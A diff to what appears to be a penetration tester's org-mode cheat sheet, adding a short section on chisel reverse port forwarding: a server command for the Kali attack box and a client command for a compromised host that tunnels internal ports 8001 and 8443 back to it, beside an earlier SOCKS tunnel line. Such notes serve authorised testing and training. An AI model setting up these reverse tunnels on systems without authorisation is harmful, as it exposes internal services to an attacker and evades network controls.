@@ -376,7 +376,17 @@ chisel64.exe client 192.168.45.217:8000 R:socks
    #+begin_example
 socks5 127.0.0.1:1080
    #+end_example
+  Chisel Port forwarding 
 
+   #+begin_example
+./chisel server --reverse --port 51234 -> On Kali
+chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443 -> On remote server 
+                                               ^                     ^    
+                                               |                     |___ attack-ip:attack-port:target-ip:target-port
+                                               |
+                                               |___ attack-ip:attack-port:target-ip:target-port
+ 
+   #+end_example
 * Enumeration
   
 ** General
